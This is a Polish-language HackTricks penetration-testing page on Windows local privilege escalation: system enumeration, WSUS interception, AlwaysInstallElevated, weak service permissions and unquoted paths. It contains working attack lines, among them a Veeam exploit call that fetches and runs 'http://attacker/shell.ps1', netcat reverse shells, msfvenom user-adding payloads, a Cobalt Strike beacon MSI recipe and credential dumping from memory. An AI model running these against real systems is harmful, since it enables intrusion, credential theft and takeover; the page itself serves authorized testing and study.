# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Wstępna teoria Windows

### Access Tokens

**Jeśli nie wiesz, czym są Windows Access Tokens, przeczytaj następującą stronę przed kontynuowaniem:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sprawdź następującą stronę, aby uzyskać więcej informacji o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Jeśli nie wiesz, czym są integrity levels w Windows, powinieneś przeczytać następującą stronę przed kontynuowaniem:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Kontrole bezpieczeństwa Windows

W systemie Windows istnieją różne rzeczy, które mogą **prevent you from enumerating the system**, uniemożliwić uruchamianie plików wykonywalnych lub nawet **detect your activities**. Powinieneś **read** następującą **page** i **enumerate** wszystkie te **defenses** **mechanisms** **before starting the privilege escalation enumeration**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informacje o systemie

### Version info enumeration

Sprawdź, czy wersja Windows ma jakieś znane podatności (sprawdź także zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Eksploity zależne od wersji

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.

**Na systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowanego watsona)_

**Lokalnie — z informacjami o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy jakieś dane uwierzytelniające lub istotne informacje są zapisane w zmiennych środowiskowych?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć, na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Szczegóły wykonywania pipeline'ów PowerShell są rejestrowane — obejmują wykonywane polecenia, wywołania poleceń oraz fragmenty skryptów. Jednak pełne szczegóły wykonania i wyniki mogą nie zostać zarejestrowane.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Transcript files" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z logów PowersShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Pełny rejestr aktywności i zawartości skryptu jest zapisywany podczas jego wykonywania, co zapewnia dokumentację każdego bloku kodu w trakcie uruchomienia. Proces ten zachowuje kompleksowy ślad audytowy każdej aktywności, cenny dla informatyki śledczej i analizy złośliwych zachowań. Dokumentując wszystkie działania w momencie wykonywania, dostarcza szczegółowego wglądu w przebieg procesu.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zdarzenia związane ze Script Block można znaleźć w Windows Event Viewer pod ścieżką: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić ostatnie 20 zdarzeń, możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia Internetu
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz przejąć system, jeśli aktualizacje nie są pobierane za pomocą http**S**, lecz za pomocą http.

Zacznij od sprawdzenia, czy sieć używa aktualizacji WSUS bez SSL, uruchamiając następujące polecenie w cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Lub następujące w PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Wówczas, **it is exploitable.** Jeśli ostatni wpis rejestru ma wartość 0, wpis WSUS zostanie zignorowany.

Aby wykorzystać te podatności, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — są to skrypty MiTM weaponized exploits służące do wstrzyknięcia 'fake' aktualizacji w ruch WSUS bez SSL.

Przeczytaj badania tutaj:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Zasadniczo, oto luka, którą ten bug wykorzystuje:

> Jeśli mamy możliwość zmodyfikowania naszego lokalnego proxy użytkownika, a Windows Updates używa proxy skonfigurowanego w ustawieniach Internet Explorer, mamy zatem możliwość uruchomienia lokalnie [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod jako podwyższony użytkownik na naszym hoście.
>
> Ponadto, ponieważ usługa WSUS używa ustawień bieżącego użytkownika, będzie także korzystać z jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat samopodpisany dla nazwy hosta WSUS i dodamy ten certyfikat do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwycić zarówno HTTP, jak i HTTPS ruch WSUS. WSUS nie używa mechanizmów podobnych do HSTS do wdrożenia walidacji typu trust-on-first-use dla certyfikatu. Jeśli prezentowany certyfikat jest zaufany przez użytkownika i posiada poprawny hostname, zostanie zaakceptowany przez usługę.

Można wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy będzie dostępne).

## Automatyczne aktualizatory firm trzecich i Agent IPC (local privesc)

Wiele agentów enterprise udostępnia powierzchnię IPC nasłuchującą na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli enrollment można wymusić na serwerze atakującego, a updater ufa rogue root CA lub ma słabe sprawdzanie podpisów, lokalny użytkownik może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Zobacz uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) tutaj:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` udostępnia usługę na localhost na **TCP/9401**, która przetwarza wiadomości kontrolowane przez atakującego, umożliwiając wykonywanie dowolnych poleceń jako **NT AUTHORITY\SYSTEM**.

- **Recon**: potwierdź listener i wersję, np. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: umieść PoC taki jak `VeeamHax.exe` wraz z wymaganymi Veeam DLL w tym samym katalogu, a następnie wywołaj SYSTEM payload przez lokalny socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Usługa wykonuje polecenie jako SYSTEM.
## KrbRelayUp

W systemach Windows w środowiskach domenowych występuje podatność typu **local privilege escalation** w określonych warunkach. Warunki te obejmują środowiska, w których **LDAP signing nie jest wymuszony**, użytkownicy posiadają uprawnienia pozwalające im skonfigurować **Resource-Based Constrained Delegation (RBCD)** oraz możliwość tworzenia komputerów w domenie. Ważne jest, że te **wymagania** są spełnione przy **domyślnych ustawieniach**.

Znajdź **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Aby uzyskać więcej informacji o przebiegu ataku sprawdź [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Jeśli** te 2 klucze rejestru są **włączone** (wartość **0x1**), to użytkownicy o dowolnym poziomie uprawnień mogą **zainstalować** (uruchomić) `*.msi` jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę, używając modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu Windows MSI binary do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (więc będziesz potrzebować dostępu do GUI):
```
Write-UserAddMSI
```
Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten tutorial, aby dowiedzieć się, jak utworzyć MSI wrapper za pomocą tych narzędzi. Zauważ, że możesz opakować plik "**.bat**", jeśli **tylko** chcesz **wykonać** **polecenia**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit nowy **Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz "installer" w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (wybierz pliki do dołączenia). Kliknij **Add** i wybierz payload Beacon, który właśnie wygenerowałeś. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
- Istnieją inne właściwości, które możesz zmienić, takie jak **Author** i **Manufacturer**, co może sprawić, że zainstalowana aplikacja będzie wyglądać bardziej wiarygodnie.
- Kliknij prawym przyciskiem myszy projekt i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz swój plik **beacon.exe** i kliknij **OK**. To zapewni uruchomienie payloadu beacon natychmiast po uruchomieniu instalatora.
- W **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
- Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawisz platformę na x64.

### MSI Installation

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność możesz użyć: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Te ustawienia decydują o tym, co jest **rejestrowane**, więc należy zwrócić na to uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — warto wiedzieć, dokąd są wysyłane logi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** jest zaprojektowany do **zarządzania hasłami kont lokalnego Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą być dostępne tylko dla użytkowników, którym przyznano odpowiednie uprawnienia za pomocą ACLs, umożliwiając im przeglądanie haseł administratora lokalnego, jeśli są do tego uprawnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **hasła w postaci jawnego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Od **Windows 8.1** Microsoft wprowadził rozszerzone zabezpieczenia dla Local Security Authority (LSA), aby **zablokować** próby niezweryfikowanych procesów mające na celu **odczytanie jego pamięci** lub wstrzyknięcie kodu, dodatkowo zwiększając bezpieczeństwo systemu.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest zabezpieczenie credentials przechowywanych na urządzeniu przed zagrożeniami takimi jak ataki pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika są uwierzytelniane przez zarejestrowany pakiet zabezpieczeń, domain credentials dla tego użytkownika są zwykle ustanawiane.\
[**Więcej informacji o Cached Credentials tutaj**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy & Grupy

### Wylicz użytkowników & grup

Sprawdź, czy któraś z grup, do których należysz, ma interesujące uprawnienia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś grupy uprzywilejowanej, możesz być w stanie eskalować uprawnienia**. Dowiedz się o grupach uprzywilejowanych i jak je wykorzystać do eskalacji uprawnień tutaj:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacja tokenami

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się o interesujących tokenach** i jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Katalogi domowe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, listując procesy, **sprawdź, czy w command line procesu nie ma passwords**.\
Sprawdź, czy możesz **overwrite some binary running** lub czy masz write permissions do folderu z binary, aby wykorzystać możliwe [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj, czy działają możliwe [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień plików binarnych procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów binarek procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci uruchomionego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP mają **credentials in clear text in memory**, spróbuj zrzucić pamięć i odczytać credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwolić użytkownikowi na uruchomienie CMD lub przeglądanie katalogów.**

Przykład: "Windows Help and Support" (Windows + F1), wyszukaj "command prompt", kliknij "Click to open Command Prompt"

## Usługi

Service Triggers pozwalają Windows uruchomić usługę, gdy wystąpią określone warunki (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Nawet bez uprawnień SERVICE_START często można uruchomić uprzywilejowane usługi, aktywując ich triggers. Zobacz techniki enumeracji i aktywacji tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

Uzyskaj listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się posiadanie binarki **accesschk** z _Sysinternals_ w celu sprawdzenia wymaganego poziomu uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzenie, czy "Authenticated Users" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Możesz pobrać accesschk.exe dla XP tutaj](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli otrzymujesz ten błąd (na przykład dla SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Możesz ją włączyć używając
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Weź pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki binarki usługi**

W scenariuszu, w którym grupa "Authenticated users" posiada **SERVICE_ALL_ACCESS** na usłudze, możliwa jest modyfikacja pliku wykonywalnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponowne uruchomienie usługi
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia można eskalować poprzez różne prawa:

- **SERVICE_CHANGE_CONFIG**: Pozwala na rekonfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia rekonfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usługi.
- **WRITE_OWNER**: Pozwala na przejęcie własności i rekonfigurację uprawnień.
- **GENERIC_WRITE**: Nadaje możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również nadaje możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia plików binarnych usług

**Sprawdź, czy możesz zmodyfikować plik binarny, który jest uruchamiany przez usługę** lub czy masz **uprawnienia zapisu do katalogu**, w którym znajduje się ten plik ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz uzyskać listę wszystkich plików binarnych uruchamianych przez usługę za pomocą **wmic** (nie w system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz także użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Uprawnienia do modyfikacji rejestru usług

Powinieneś sprawdzić, czy możesz modyfikować którykolwiek rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** względem rejestru **usług**, wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, binarkę uruchamianą przez usługę można zmodyfikować.

Aby zmienić ścieżkę do uruchamianej binarki:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Rejestr usług AppendData/AddSubdirectory uprawnienia

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć podrejestry z tego rejestru**. W przypadku Windows services jest to **wystarczające do wykonania dowolnego kodu:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje wykonać każdy fragment kończący się przed spacją.

Na przykład, dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje wykonać:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Wypisz wszystkie ścieżki usług bez cudzysłowów, z wyłączeniem tych należących do wbudowanych usług Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i exploit** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcje odzyskiwania

Windows pozwala użytkownikom określić działania, które mają być wykonane w przypadku awarii usługi. Ta funkcja może być skonfigurowana tak, aby wskazywać na binary. Jeśli ten binary można zastąpić, privilege escalation może być możliwe. Więcej szczegółów można znaleźć w [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **permissions of the binaries** (może uda się nadpisać jeden i escalate privileges) i **foldery** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować plik konfiguracyjny, aby odczytać jakiś specjalny plik lub czy możesz zmodyfikować binarkę, która zostanie uruchomiona przez konto Administratora (schedtasks).

Jednym ze sposobów znalezienia słabych uprawnień do folderów/plików w systemie jest wykonanie:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
